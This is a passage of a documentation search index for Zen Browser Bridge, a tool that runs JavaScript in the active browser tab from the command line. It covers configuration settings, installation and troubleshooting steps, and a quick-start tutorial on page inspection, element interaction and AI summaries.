\"nl\"\n}\n</code></pre> <p>All control settings use defaults.</p>"},{"location":"getting-started/configuration/#accessibility-focused-configuration","title":"Accessibility-Focused Configuration","text":"<p>For users relying on screen readers and audio feedback:</p> <pre><code>{\n  \"ai-language\": \"en\",\n  \"control\": {\n    \"auto-refocus\": \"always\",\n    \"speak-all\": true,\n    \"speak-name\": true,\n    \"announce-role\": true,\n    \"announce-on-page-load\": true,\n    \"sound-on-focus\": \"subtle\",\n    \"verbose\": true,\n    \"selector-strategy\": \"aria-first\"\n  }\n}\n</code></pre>"},{"location":"getting-started/configuration/#performance-optimized-configuration","title":"Performance-Optimized Configuration","text":"<p>Minimal visual effects for faster performance:</p> <pre><code>{\n  \"ai-language\": \"auto\",\n  \"control\": {\n    \"focus-animation\": false,\n    \"focus-glow\": false,\n    \"scroll-on-focus\": false,\n    \"speak-all\": false,\n    \"verbose\": false,\n    \"verbose-logging\": false\n  }\n}\n</code></pre>"},{"location":"getting-started/configuration/#high-contrast-configuration","title":"High-Contrast Configuration","text":"<p>Enhanced visibility with bold outlines:</p> <pre><code>{\n  \"ai-language\": \"auto\",\n  \"control\": {\n    \"focus-outline\": \"custom\",\n    \"focus-color\": \"#ffff00\",\n    \"focus-size\": 5,\n    \"focus-animation\": true,\n    \"focus-glow\": true\n  }\n}\n</code></pre>"},{"location":"getting-started/configuration/#developerdebug-configuration","title":"Developer/Debug Configuration","text":"<p>Maximum logging and visibility:</p> <pre><code>{\n  \"ai-language\": \"auto\",\n  \"control\": {\n    \"auto-refocus\": \"always\",\n    \"verbose\": true,\n    \"verbose-logging\": true,\n    \"refocus-timeout\": 5000,\n    \"focus-color\": \"#ff00ff\",\n    \"focus-size\": 4\n  }\n}\n</code></pre>"},{"location":"getting-started/configuration/#applying-configuration-changes","title":"Applying Configuration Changes","text":""},{"location":"getting-started/configuration/#reload-configuration","title":"Reload Configuration","text":"<p>Configuration is loaded when:</p> <ol> <li>Server starts - <code>zen server start</code></li> <li>Control mode starts - <code>zen control</code></li> </ol> <p>To apply changes:</p> Restart Control ModeRestart Server <pre><code># Press 'q' in control mode to quit, then restart\nzen control\n</code></pre> <pre><code>zen server stop\nzen server start --daemon\n</code></pre> <p>Live Reload</p> <p>Control mode configuration is sent to the browser when you start <code>zen control</code>, so you just need to quit and restart control mode to apply changes.</p>"},{"location":"getting-started/configuration/#customizing-ai-prompts","title":"Customizing AI Prompts","text":"<p>AI prompts are stored in separate files for easy customization:</p>"},{"location":"getting-started/configuration/#summary-prompt","title":"Summary Prompt","text":"<p>Location: <code>prompts/summary.prompt</code></p> <p>Edit this file to change how articles are summarized:</p> <pre><code>Provide a concise, structured summary of the following article.\nFocus on the main points and key takeaways.\n\nArticle content:\n{content}\n</code></pre>"},{"location":"getting-started/configuration/#description-prompt","title":"Description Prompt","text":"<p>Location: <code>prompts/describe.prompt</code></p> <p>Edit this file to change how pages are described:</p> <pre><code>Describe this webpage in a way that would be helpful for someone\nusing a screen reader. Focus on navigation, main content, and structure.\n\nPage structure:\n{content}\n</code></pre> <p>Variables available: <code>{content}</code>, <code>{url}</code>, <code>{title}</code>, <code>{language}</code></p>"},{"location":"getting-started/configuration/#configuration-hierarchy","title":"Configuration Hierarchy","text":"<p>Configuration is loaded in the following order (later values override earlier ones):</p> <ol> <li>Default values (hardcoded in <code>zen/domain/models.py</code>)</li> <li><code>config.json</code> (project root)</li> <li>Command-line flags (where applicable)</li> </ol> <p>Example:</p> <pre><code># Default verbose=true, but config.json sets verbose=false\n# Result: verbose=false\n\n# But if you pass a flag:\nzen control --verbose\n# Result: verbose=true (flag overrides config)\n</code></pre> <p>No CLI Flags for Config</p> <p>Currently, Zen Bridge doesn't support command-line flags for most configuration options. Edit <code>config.json</code> to customize behavior.</p>"},{"location":"getting-started/configuration/#troubleshooting-configuration","title":"Troubleshooting Configuration","text":""},{"location":"getting-started/configuration/#configuration-not-loading","title":"Configuration Not Loading","text":"<p>Problem: Changes to <code>config.json</code> don't seem to apply.</p> <p>Solutions:</p> <ol> <li> <p>Check JSON syntax:    <pre><code># Validate JSON\npython3 -c \"import json; json.load(open('config.json'))\"\n</code></pre></p> </li> <li> <p>Check file location:    <pre><code># Ensure config.json is in project root\nls -la config.json\n</code></pre></p> </li> <li> <p>Restart server and control mode:    <pre><code>zen server stop\nzen server start --daemon\nzen control\n</code></pre></p> </li> </ol>"},{"location":"getting-started/configuration/#invalid-configuration-value","title":"Invalid Configuration Value","text":"<p>Problem: Server or control mode fails to start.</p> <p>Solution: Check for invalid values:</p> <ul> <li><code>auto-refocus</code>: Must be <code>\"always\"</code>, <code>\"only-spa\"</code>, or <code>\"never\"</code></li> <li><code>focus-outline</code>: Must be <code>\"custom\"</code>, <code>\"original\"</code>, or <code>\"none\"</code></li> <li><code>sound-on-focus</code>: Must be <code>\"none\"</code>, <code>\"beep\"</code>, <code>\"click\"</code>, or <code>\"subtle\"</code></li> <li><code>selector-strategy</code>: Must be <code>\"id-first\"</code>, <code>\"aria-first\"</code>, or <code>\"css-first\"</code></li> <li><code>refocus-timeout</code>: Must be number &gt;= 100</li> <li><code>focus-size</code>: Must be number &gt;= 1</li> </ul>"},{"location":"getting-started/configuration/#configuration-ignored","title":"Configuration Ignored","text":"<p>Problem: Some settings don't seem to work.</p> <p>Check:</p> <ol> <li>Feature support: Some features (like TTS) only work on macOS</li> <li>Browser compatibility: Sound effects require Web Audio API</li> <li>Spelling: JSON keys are case-sensitive and use hyphens</li> </ol>"},{"location":"getting-started/configuration/#advanced-programmatic-configuration","title":"Advanced: Programmatic Configuration","text":"<p>You can load and validate configuration programmatically:</p> <pre><code>from zen.domain.models import ZenConfig\n\n# Load from file\nwith open('config.json') as f:\n    config_dict = json.load(f)\n\n# Validate with Pydantic\nconfig = ZenConfig(**config_dict)\n\n# Access settings\nprint(config.ai_language)  # \"auto\"\nprint(config.control.auto_refocus)  # \"only-spa\"\nprint(config.control.focus_color)  # \"#0066ff\"\n</code></pre> <p>This is useful for building extensions or integrating Zen Bridge into other tools.</p>"},{"location":"getting-started/configuration/#next-steps","title":"Next Steps","text":"<p>Now that you've configured Zen Bridge to your liking:</p> <ul> <li> <p> User Guide</p> <p>Learn all commands and features in depth.</p> <p> User Guide</p> </li> <li> <p> Control Mode Guide</p> <p>Master keyboard navigation with control mode.</p> <p> Control Mode</p> </li> <li> <p> AI Features</p> <p>Explore AI-powered summarization and description.</p> <p> AI Features</p> </li> <li> <p> API Reference</p> <p>Complete reference for all configuration models.</p> <p> Models Reference</p> </li> </ul>"},{"location":"getting-started/configuration/#configuration-reference","title":"Configuration Reference","text":"<p>Quick reference for all available settings:</p> Setting Type Default Description <code>ai-language</code> <code>string</code> <code>\"auto\"</code> Language for AI operations <code>control.auto-refocus</code> <code>string</code> <code>\"only-spa\"</code> When to auto-refocus <code>control.focus-outline</code> <code>string</code> <code>\"custom\"</code> Focus outline style <code>control.speak-name</code> <code>boolean</code> <code>false</code> Speak element name <code>control.speak-all</code> <code>boolean</code> <code>true</code> Speak all terminal output <code>control.announce-role</code> <code>boolean</code> <code>false</code> Announce element role <code>control.announce-on-page-load</code> <code>boolean</code> <code>false</code> Announce page title on load <code>control.navigation-wrap</code> <code>boolean</code> <code>true</code> Wrap navigation at end <code>control.scroll-on-focus</code> <code>boolean</code> <code>true</code> Scroll to focused element <code>control.click-delay</code> <code>number</code> <code>0</code> Delay before clicks (ms) <code>control.focus-color</code> <code>string</code> <code>\"#0066ff\"</code> Focus outline color <code>control.focus-size</code> <code>number</code> <code>3</code> Focus outline width (px) <code>control.focus-animation</code> <code>boolean</code> <code>true</code> Animate focus transitions <code>control.focus-glow</code> <code>boolean</code> <code>true</code> Add glow effect <code>control.sound-on-focus</code> <code>string</code> <code>\"none\"</code> Sound on focus change <code>control.selector-strategy</code> <code>string</code> <code>\"id-first\"</code> Element selector strategy <code>control.refocus-timeout</code> <code>number</code> <code>2000</code> Refocus timeout (ms) <code>control.verbose</code> <code>boolean</code> <code>true</code> Terminal announcements <code>control.verbose-logging</code> <code>boolean</code> <code>false</code> Browser console logging"},{"location":"getting-started/installation/","title":"Installation","text":"<p>This comprehensive guide will walk you through installing Zen Browser Bridge on your system, from installing Python dependencies to setting up the browser userscript and verifying everything works correctly.</p>"},{"location":"getting-started/installation/#installation-flow","title":"Installation Flow","text":"<pre><code>flowchart LR\n    A[Install CLI] --&gt; B[Install Userscript]\n    B --&gt; C[Start Server]\n    C --&gt; D[Test Connection]\n    D --&gt; E[Ready!]\n\n    style A fill:#e1f5ff\n    style B fill:#fff4e1\n    style C fill:#ffe1f5\n    style D fill:#fff9e6\n    style E fill:#e1ffe1</code></pre>"},{"location":"getting-started/installation/#requirements","title":"Requirements","text":"<p>Before you begin, ensure you have the following:</p> <ul> <li>Python 3.11 or higher - Check your version with <code>python --version</code> or <code>python3 --version</code></li> <li>pip - Python package manager (usually included with Python)</li> <li>A modern browser - Chrome, Firefox, Edge, Safari, or any Chromium-based browser</li> <li>A userscript manager extension - We'll install this in the browser setup step</li> </ul> <p>Python Version Check</p> <p>Run <code>python3 --version</code> to check your Python version. If you have Python 3.10 or lower, you'll need to upgrade to Python 3.11 or higher.</p> macOSUbuntu/DebianWindows <pre><code># Using Homebrew\nbrew install python@3.11\n</code></pre> <pre><code>sudo apt update\nsudo apt install python3.11 python3.11-pip\n</code></pre> <p>Download from python.org and install Python 3.11+</p>"},{"location":"getting-started/installation/#step-1-install-the-cli-tool","title":"Step 1: Install the CLI Tool","text":"<p>You can install Zen Browser Bridge from source (recommended for development) or via pip (when available).</p> From Source (Recommended)Install Dependencies ManuallyFor Development <p>Clone the repository and install in development mode:</p> <pre><code># Clone the repository\ngit clone https://github.com/roelvangils/zen-bridge.git\ncd zen-bridge\n\n# Install in development mode\npip install -e .\n</code></pre> <p>This installs the <code>zen</code> command and all dependencies. The <code>-e</code> flag means \"editable\" - changes to the source code will be reflected immediately.</p> <p>If you prefer to manage dependencies yourself:</p> <pre><code># Clone the repository\ngit clone https://github.com/roelvangils/zen-bridge.git\ncd zen-bridge\n\n# Install dependencies\npip install -r requirements.txt\n</code></pre> <p>If you plan to contribute or run tests:</p> <pre><code># Clone the repository\ngit clone https://github.com/roelvangils/zen-bridge.git\ncd zen-bridge\n\n# Install with dev dependencies\npip install -e \".[dev]\"\n</code></pre> <p>This includes testing tools (pytest, playwright), linters (ruff), and type checkers (mypy).</p>"},{"location":"getting-started/installation/#verify-the-installation","title":"Verify the Installation","text":"<p>After installation, verify the <code>zen</code> command is available:</p> <pre><code>zen --version\n</code></pre> <p>You should see output like:</p> <pre><code>Zen Browser Bridge v2.0.0\n</code></pre> <p>Run the help command to see available commands:</p> <pre><code>zen --help\n</code></pre> <p>Installation Complete</p> <p>The CLI tool is now installed! Next, we'll set up the browser connection.</p>"},{"location":"getting-started/installation/#step-2-install-the-browser-userscript","title":"Step 2: Install the Browser Userscript","text":"<p>The browser needs a userscript to receive commands from the CLI. This userscript establishes a WebSocket connection to the server.</p>"},{"location":"getting-started/installation/#21-install-a-userscript-manager","title":"2.1 Install a Userscript Manager","text":"<p>First, install a userscript manager extension in your browser:</p> Violentmonkey (Recommended)TampermonkeyGreasemonkey (Firefox only) <p>Best compatibility and open source.</p> <ul> <li>Chrome/Edge</li> <li>Firefox</li> <li>Safari</li> </ul> <p>Popular alternative with many features.</p> <ul> <li>Chrome/Edge</li> <li>Firefox</li> <li>Safari</li> </ul> <p>Classic Firefox userscript manager.</p> <ul> <li>Firefox</li> </ul> <p>Browser Compatibility</p> <p>Zen Bridge works with any browser that supports userscript managers and WebSockets. This includes all modern browsers.</p>"},{"location":"getting-started/installation/#22-get-the-userscript-code","title":"2.2 Get the Userscript Code","text":"<p>Display the userscript code using the CLI:</p> <pre><code>zen userscript\n</code></pre> <p>This will output the complete userscript code to your terminal. The userscript is located at <code>/Users/roelvangils/zen_bridge/userscript_ws.js</code> in the repository.</p>"},{"location":"getting-started/installation/#23-create-the-userscript","title":"2.3 Create the Userscript","text":"<p>Now create a new userscript in your userscript manager:</p> <ol> <li>Click the userscript manager icon in your browser toolbar</li> <li>Create a new script (usually a \"+\" or \"New Script\" button)</li> <li>Delete any default content in the editor</li> <li>Paste the userscript code from the <code>zen userscript</code> command</li> <li>Save the script (usually Ctrl+S or Cmd+S)</li> </ol> <p>The userscript will automatically enable itself.</p> <p>Quick Copy</p> <p>To copy the userscript to your clipboard (macOS): <pre><code>zen userscript | pbcopy\n</code></pre></p> <p>Or save it to a file: <pre><code>zen userscript &gt; my-userscript.js\n</code></pre></p>"},{"location":"getting-started/installation/#24-verify-userscript-is-active","title":"2.4 Verify Userscript is Active","text":"<p>To verify the userscript is running:</p> <ol> <li>Open your browser's Developer Console (F12 or Cmd+Option+I)</li> <li>Look for a message like: \"Zen Bridge userscript loaded\"</li> <li>Check that the userscript manager shows the script as enabled</li> </ol> <p>Userscript Scope</p> <p>By default, the userscript runs on all pages (<code>@match *://*/*</code>). If you want to restrict it to specific domains, edit the <code>@match</code> line in the userscript.</p>"},{"location":"getting-started/installation/#step-3-start-the-bridge-server","title":"Step 3: Start the Bridge Server","text":"<p>The bridge server acts as a middleman between the CLI and browser, managing WebSocket connections and HTTP endpoints.</p>"},{"location":"getting-started/installation/#31-start-the-server","title":"3.1 Start the Server","text":"<p>You can start the server in foreground or background mode:</p> Background Mode (Daemon)Foreground Mode <p>Recommended for normal use:</p> <pre><code>zen server start --daemon\n</code></pre> <p>The server runs in the background. You can close your terminal and it will keep running.</p> <p>Check server status: <pre><code>zen server status\n</code></pre></p> <p>Stop the server: <pre><code>zen server stop\n</code></pre></p> <p>Useful for debugging:</p> <pre><code>zen server start\n</code></pre> <p>The server runs in the foreground with live log output. Press Ctrl+C to stop.</p> <p>Example output: <pre><code>Starting Zen Bridge WebSocket server...\nHTTP API server: http://127.0.0.1:8765\nWebSocket server: ws://127.0.0.1:8766\nServer is ready! Waiting for browser connections...\n</code></pre></p>"},{"location":"getting-started/installation/#32-server-ports","title":"3.2 Server Ports","text":"<p>The server uses two ports:</p> <ul> <li>HTTP API: <code>http://127.0.0.1:8765</code> - CLI communicates with this</li> <li>WebSocket: <code>ws://127.0.0.1:8766</code> - Browser connects to this</li> </ul> <p>Port Configuration</p> <p>The ports are currently hardcoded. If you need to change them, you'll need to modify the server configuration and userscript.</p>"},{"location":"getting-started/installation/#33-verify-server-is-running","title":"3.3 Verify Server is Running","text":"<p>Check the server status:</p> <pre><code>zen server status\n</code></pre> <p>Expected output when running:</p> <pre><code>\u2713 Server is running\n  PID: 12345\n  HTTP API: http://127.0.0.1:8765\n  WebSocket: ws://127.0.0.1:8766\n  Connected browsers: 0\n  Uptime: 2 minutes\n</code></pre>"},{"location":"getting-started/installation/#step-4-verify-the-complete-setup","title":"Step 4: Verify the Complete Setup","text":"<p>Now let's verify that everything is working together:</p>"},{"location":"getting-started/installation/#41-open-a-browser-tab","title":"4.1 Open a Browser Tab","text":"<ol> <li>Open your browser (with the userscript manager and userscript installed)</li> <li>Navigate to any website, for example: https://example.com</li> <li>Keep the tab active (the userscript only works in active tabs)</li> </ol>"},{"location":"getting-started/installation/#42-check-browser-connection","title":"4.2 Check Browser Connection","text":"<p>In the browser's Developer Console (F12), you should see:</p> <pre><code>Zen Bridge userscript loaded\nConnected to Zen Bridge WebSocket server\n</code></pre>"},{"location":"getting-started/installation/#43-execute-a-test-command","title":"4.3 Execute a Test Command","text":"<p>From your terminal, run a simple command:</p> <pre><code>zen eval \"document.title\"\n</code></pre> <p>Expected output:</p> <pre><code>Example Domain\n</code></pre> <p>If you see the page title, congratulations! Everything is working correctly.</p> <p>Connection Successful!</p> <p>Your terminal is now connected to your browser. You can execute JavaScript directly in the active tab!</p>"},{"location":"getting-started/installation/#44-try-more-commands","title":"4.4 Try More Commands","text":"<pre><code># Get page information\nzen info\n\n# Get the current URL\nzen eval \"location.href\"\n\n# Count links on the page\nzen eval \"document.querySelectorAll('a').length\"\n\n# Start interactive REPL\nzen repl\n</code></pre> <p>Setup Complete!</p> <p>You've successfully installed Zen Browser Bridge! Check out the Quick Start Guide for a hands-on tutorial.</p>"},{"location":"getting-started/installation/#troubleshooting","title":"Troubleshooting","text":""},{"location":"getting-started/installation/#zen-command-not-found","title":"\"zen: command not found\"","text":"<p>Problem: The <code>zen</code> command is not in your PATH.</p> <p>Solutions:</p> Check InstallationUpdate PATHUse python -m <pre><code># Verify installation\npip show zen-bridge\n\n# Reinstall if needed\npip install -e .\n</code></pre> <pre><code># Find where pip installs scripts\npython3 -m site --user-base\n\n# Add to PATH (add to ~/.bashrc or ~/.zshrc)\nexport PATH=\"$PATH:$(python3 -m site --user-base)/bin\"\n</code></pre> <pre><code># Run as a module instead\npython3 -m zen.cli --help\n</code></pre>"},{"location":"getting-started/installation/#bridge-server-is-not-running","title":"\"Bridge server is not running\"","text":"<p>Problem: The CLI cannot connect to the server.</p> <p>Solutions:</p> <ol> <li> <p>Start the server:    <pre><code>zen server start --daemon\n</code></pre></p> </li> <li> <p>Check if server is running:    <pre><code>zen server status\n</code></pre></p> </li> <li> <p>Restart the server:    <pre><code>zen server stop\nzen server start --daemon\n</code></pre></p> </li> <li> <p>Check for port conflicts:    <pre><code># Check if ports 8765 or 8766 are in use\nlsof -i :8765\nlsof -i :8766\n</code></pre></p> </li> </ol>"},{"location":"getting-started/installation/#no-response-from-browser","title":"\"No response from browser\"","text":"<p>Problem: The browser is not connected to the WebSocket server.</p> <p>Solutions:</p> <ol> <li>Verify userscript is installed and enabled</li> <li>Check userscript manager icon</li> <li> <p>Ensure script is enabled</p> </li> <li> <p>Check browser console for errors</p> </li> <li>Open DevTools (F12)</li> <li>Look for WebSocket connection errors</li> <li> <p>Ensure you see \"Connected to Zen Bridge WebSocket server\"</p> </li> <li> <p>Ensure tab is active</p> </li> <li>The userscript only works in the currently active browser tab</li> <li> <p>Switch to the tab and try again</p> </li> <li> <p>Restart everything:    <pre><code># Stop server\nzen server stop\n\n# Restart browser (to reload userscript)\n\n# Start server\nzen server start --daemon\n</code></pre></p> </li> <li> <p>Check WebSocket connection manually</p> </li> <li>In browser console, run:      <pre><code>ws = new WebSocket('ws://127.0.0.1:8766')\nws.onopen = () =&gt; console.log('Connected!')\n</code></pre></li> </ol>"},{"location":"getting-started/installation/#command-timeout","title":"Command Timeout","text":"<p>Problem: Commands hang or timeout.</p> <p>Solutions:</p> <ol> <li> <p>Increase timeout:    <pre><code>zen eval \"slow_operation()\" --timeout 30\n</code></pre></p> </li> <li> <p>Check if tab is active:</p> </li> <li>Inactive tabs may throttle JavaScript execution</li> <li> <p>Switch to the tab and try again</p> </li> <li> <p>Check for JavaScript errors:</p> </li> <li>Open browser console</li> <li>Look for errors when command executes</li> </ol>"},{"location":"getting-started/installation/#websocket-connection-refused","title":"WebSocket Connection Refused","text":"<p>Problem: Browser cannot connect to WebSocket server.</p> <p>Solutions:</p> <ol> <li> <p>Verify server is running:    <pre><code>zen server status\n</code></pre></p> </li> <li> <p>Check firewall settings:</p> </li> <li>Ensure localhost connections are allowed</li> <li> <p>Port 8766 must be accessible</p> </li> <li> <p>Try a different port (requires code modification):</p> </li> <li>Edit server configuration</li> <li>Update userscript to match</li> </ol>"},{"location":"getting-started/installation/#python-version-issues","title":"Python Version Issues","text":"<p>Problem: Zen Bridge requires Python 3.11+, but you have an older version.</p> <p>Solution: Upgrade Python:</p> macOS (Homebrew)Ubuntu/DebianWindows <pre><code>brew install python@3.11\n# Update PATH in ~/.zshrc or ~/.bashrc\nexport PATH=\"/usr/local/opt/python@3.11/bin:$PATH\"\n</code></pre> <pre><code>sudo apt update\nsudo apt install python3.11 python3.11-pip\n# Use python3.11 explicitly\npython3.11 -m pip install -e .\n</code></pre> <p>Download and install from python.org</p>"},{"location":"getting-started/installation/#uninstallation","title":"Uninstallation","text":"<p>To uninstall Zen Browser Bridge:</p>"},{"location":"getting-started/installation/#1-stop-the-server","title":"1. Stop the Server","text":"<pre><code>zen server stop\n</code></pre>"},{"location":"getting-started/installation/#2-uninstall-the-package","title":"2. Uninstall the Package","text":"<pre><code># If installed with pip\npip uninstall zen-bridge\n\n# If installed from source, just delete the directory\nrm -rf ~/zen-bridge\n</code></pre>"},{"location":"getting-started/installation/#3-remove-browser-userscript","title":"3. Remove Browser Userscript","text":"<ol> <li>Click userscript manager icon</li> <li>Find \"Zen Bridge\" script</li> <li>Delete or disable the script</li> </ol>"},{"location":"getting-started/installation/#next-steps","title":"Next Steps","text":"<p>Now that you have Zen Browser Bridge installed, continue with:</p> <ul> <li>Quick Start Guide - 5-minute hands-on tutorial</li> <li>Configuration - Customize your setup</li> <li>User Guide - Learn all commands and features</li> </ul>"},{"location":"getting-started/installation/#additional-resources","title":"Additional Resources","text":"<ul> <li>GitHub Repository - Source code and issues</li> <li>Architecture Guide - How Zen Bridge works internally</li> <li>Security Guide - Security model and best practices</li> </ul>"},{"location":"getting-started/quick-start/","title":"Quick Start","text":"<p>Get up and running with Zen Browser Bridge in just 5 minutes! This hands-on tutorial will walk you through the basics and show you the power of browser automation from the command line.</p> <p>Prerequisites</p> <p>Make sure you've completed the Installation guide before starting this tutorial.</p>"},{"location":"getting-started/quick-start/#quick-start-workflow","title":"Quick Start Workflow","text":"<p>Here's what we'll cover in this tutorial:</p> <pre><code>graph LR\n    A[Execute JavaScript] --&gt; B[Use REPL]\n    B --&gt; C[Extract Data]\n    C --&gt; D[Automate Tasks]\n    D --&gt; E[Advanced Features]\n\n    style A fill:#e1f5ff\n    style B fill:#fff4e1\n    style C fill:#ffe1f5\n    style D fill:#fff9e6\n    style E fill:#e1ffe1</code></pre>"},{"location":"getting-started/quick-start/#your-first-commands","title":"Your First Commands","text":""},{"location":"getting-started/quick-start/#step-1-navigate-to-a-test-page","title":"Step 1: Navigate to a Test Page","text":"<p>Open your browser and navigate to https://example.com. Keep this tab active.</p>"},{"location":"getting-started/quick-start/#step-2-execute-javascript","title":"Step 2: Execute JavaScript","text":"<p>Run your first command to get the page title:</p> <pre><code>zen eval \"document.title\"\n</code></pre> <p>Expected output:</p> <pre><code>Example Domain\n</code></pre> <p>Congratulations! You just executed JavaScript in your browser from the terminal.</p>"},{"location":"getting-started/quick-start/#step-3-try-more-expressions","title":"Step 3: Try More Expressions","text":"<pre><code># Get the current URL\nzen eval \"location.href\"\n# =&gt; https://example.com/\n\n# Count paragraphs on the page\nzen eval \"document.querySelectorAll('p').length\"\n# =&gt; 2\n\n# Get all link URLs\nzen eval \"Array.from(document.links).map(a =&gt; a.href)\"\n# =&gt; [\"https://www.iana.org/domains/example\"]\n</code></pre> <p>Quick Tip</p> <p>The <code>zen eval</code> command evaluates JavaScript expressions. For more complex code, use <code>zen exec</code> with a file.</p>"},{"location":"getting-started/quick-start/#interactive-repl-session","title":"Interactive REPL Session","text":"<p>The REPL (Read-Eval-Print Loop) lets you experiment with JavaScript interactively:</p> <pre><code>zen repl\n</code></pre> <p>Try these commands in the REPL:</p> <pre><code>// Get the page title\nzen&gt; document.title\n\"Example Domain\"\n\n// Query the DOM\nzen&gt; document.querySelectorAll('h1')[0].textContent\n\"Example Domain\"\n\n// Create an array of links\nzen&gt; Array.from(document.links).map(a =&gt; ({text: a.textContent, href: a.href}))\n[{text: \"More information...\", href: \"https://www.iana.org/domains/example\"}]\n\n// Exit the REPL\nzen&gt; exit\nGoodbye!\n</code></pre> <p>REPL Power</p> <p>The REPL is perfect for exploring APIs, debugging, and prototyping JavaScript code before adding it to scripts.</p>"},{"location":"getting-started/quick-start/#extract-page-information","title":"Extract Page Information","text":"<p>Use the <code>info</code> command to get comprehensive page details:</p> <pre><code>zen info\n</code></pre> <p>Example output:</p> <pre><code>URL:      https://example.com\nTitle:    Example Domain\nDomain:   example.com\nProtocol: https:\nState:    complete\nSize:     1280x720\n</code></pre> <p>For extended information including language, meta tags, and cookies:</p> <pre><code>zen info --extended\n</code></pre>"},{"location":"getting-started/quick-start/#working-with-links","title":"Working with Links","text":"<p>Navigate to a page with more links (like a news site or blog), then:</p>"},{"location":"getting-started/quick-start/#list-all-links","title":"List All Links","text":"<pre><code>zen links\n</code></pre> <p>Example output:</p> <pre><code>\u2192 Home Page\n  https://example.com/\n\n\u2192 About Us\n  https://example.com/about\n\n\u2197 External Resource\n  https://other-site.com/page\n\nTotal: 15 links (12 internal, 3 external)\n</code></pre>"},{"location":"getting-started/quick-start/#extract-external-links-only","title":"Extract External Links Only","text":"<pre><code>zen links --only-external --only-urls\n</code></pre> <p>This outputs just the URLs, one per line - perfect for piping to other tools.</p>"},{"location":"getting-started/quick-start/#save-links-to-a-file","title":"Save Links to a File","text":"<pre><code>zen links --only-urls &gt; all-links.txt\n</code></pre>"},{"location":"getting-started/quick-start/#get-enriched-link-metadata","title":"Get Enriched Link Metadata","text":"<pre><code>zen links --only-external --enrich-external\n</code></pre> <p>This fetches additional metadata like MIME types, file sizes, and HTTP status codes.</p>"},{"location":"getting-started/quick-start/#element-interaction","title":"Element Interaction","text":""},{"location":"getting-started/quick-start/#click-an-element","title":"Click an Element","text":"<pre><code># Click by CSS selector\nzen click \"button#submit\"\n\n# Double-click\nzen double-click \"div.editable\"\n\n# Right-click (context menu)\nzen right-click \"a.download\"\n</code></pre>"},{"location":"getting-started/quick-start/#highlight-elements","title":"Highlight Elements","text":"<p>Useful for visual debugging:</p> <pre><code># Highlight all headings\nzen highlight \"h1, h2, h3\"\n\n# Custom color\nzen highlight \"a\" --color blue\n\n# Clear highlights\nzen highlight --clear\n</code></pre>"},{"location":"getting-started/quick-start/#wait-for-elements","title":"Wait for Elements","text":"<p>Perfect for automation:</p> <pre><code># Wait for element to exist (default: 30s timeout)\nzen wait \"button#submit\"\n\n# Wait for element to be visible\nzen wait \".modal-dialog\" --visible\n\n# Wait for element to be hidden\nzen wait \".loading-spinner\" --hidden\n\n# Wait for text content\nzen wait \"div.result\" --text \"Success\"\n\n# Custom timeout (10 seconds)\nzen wait \"div.notification\" --timeout 10\n</code></pre>"},{"location":"getting-started/quick-start/#page-structure-analysis","title":"Page Structure Analysis","text":""},{"location":"getting-started/quick-start/#view-heading-hierarchy","title":"View Heading Hierarchy","text":"<pre><code>zen outline\n</code></pre> <p>Example output:</p> <pre><code>H1 Getting Started\n   H2 Installation\n      H3 Prerequisites\n      H3 Setup\n   H2 Configuration\n      H3 Basic Settings\n      H3 Advanced Options\n         H4 Environment Variables\n\nTotal: 7 headings\n</code></pre> <p>This is great for:</p> <ul> <li>Accessibility audits</li> <li>SEO analysis</li> <li>Understanding page structure</li> </ul>"},{"location":"getting-started/quick-start/#data-extraction-patterns","title":"Data Extraction Patterns","text":""},{"location":"getting-started/quick-start/#extract-table-data","title":"Extract Table Data","text":"<pre><code>zen exec zen/scripts/extract_table.js --format json &gt; data.json\n</code></pre>"},{"location":"getting-started/quick-start/#extract-all-images","title":"Extract All Images","text":"<pre><code>zen exec zen/scripts/extract_images.js --format json\n</code></pre>"},{"location":"getting-started/quick-start/#get-seo-metadata","title":"Get SEO Metadata","text":"<pre><code>zen exec zen/scripts/extract_metadata.js --format json\n</code></pre>"},{"location":"getting-started/quick-start/#custom-extraction","title":"Custom Extraction","text":"<p>Extract product prices (example):</p> <pre><code>zen eval \"\n  Array.from(document.querySelectorAll('.product')).map(p =&gt; ({\n    name: p.querySelector('.name').textContent,\n    price: p.querySelector('.price').textContent\n  }))\n\" --format json\n</code></pre> <p>Format Options</p> <p>Use <code>--format json</code> for structured output, <code>--format raw</code> for plain text, or <code>--format default</code> for human-readable output.</p>"},{"location":"getting-started/quick-start/#ai-powered-features","title":"AI-Powered Features","text":"<p>Requires mods</p> <p>AI features require mods to be installed.</p>"},{"location":"getting-started/quick-start/#summarize-an-article","title":"Summarize an Article","text":"<p>Navigate to a news article or blog post, then:</p> <pre><code>zen summarize\n</code></pre> <p>This extracts the article content using Mozilla Readability and generates a concise summary.</p>"},{"location":"getting-started/quick-start/#describe-a-page-for-screen-readers","title":"Describe a Page for Screen Readers","text":"<pre><code>zen describe\n</code></pre> <p>Example output:</p> <pre><code>This webpage is in English. At the top you can navigate to Home, About,\nServices, and Contact. The main part contains an article about browser\nautomation with three headings. The footer contains links to Privacy\nPolicy and Terms of Service.\n</code></pre> <p>Perfect for understanding page structure before diving into automation.</p>"},{"location":"getting-started/quick-start/#form-automation-example","title":"Form Automation Example","text":"<p>Let's automate filling out a login form:</p> <pre><code># Fill email field\nzen eval \"document.querySelector('#email').value = 'user@example.com'\"\n\n# Fill password field\nzen eval \"document.querySelector('#password').value = 'mypassword'\"\n\n# Click submit button\nzen click \"button[type=submit]\"\n\n# Wait for success message\nzen wait \".success-message\" --visible\n\n# Verify we're logged in\nzen eval \"document.querySelector('.user-name').textContent\"\n</code></pre> <p>Security Note</p> <p>Be careful with passwords in command history! See the Security Guide for best practices.</p>"},{"location":"getting-started/quick-start/#navigation-commands","title":"Navigation Commands","text":"<pre><code># Navigate to a URL\nzen open https://example.com\n\n# Navigate and wait for page load\nzen open https://example.com --wait\n\n# Go back in history\nzen back\n\n# Go forward in history\nzen forward\n\n# Reload the page\nzen reload\n\n# Hard reload (bypass cache)\nzen reload --hard\n</code></pre>"},{"location":"getting-started/quick-start/#working-with-text","title":"Working with Text","text":""},{"location":"getting-started/quick-start/#get-selected-text","title":"Get Selected Text","text":"<p>Select some text in the browser, then:</p> <pre><code># Get selected text with metadata\nzen selected\n\n# Raw text only\nzen selected --raw\n\n# Copy to clipboard (macOS)\nzen selected --raw | pbcopy\n</code></pre>"},{"location":"getting-started/quick-start/#send-text-to-browser","title":"Send Text to Browser","text":"<p>Type text character by character into focused field:</p> <pre><code># Type into currently focused field\nzen send \"Hello World\"\n\n# Type into specific field\nzen send \"test@example.com\" --selector 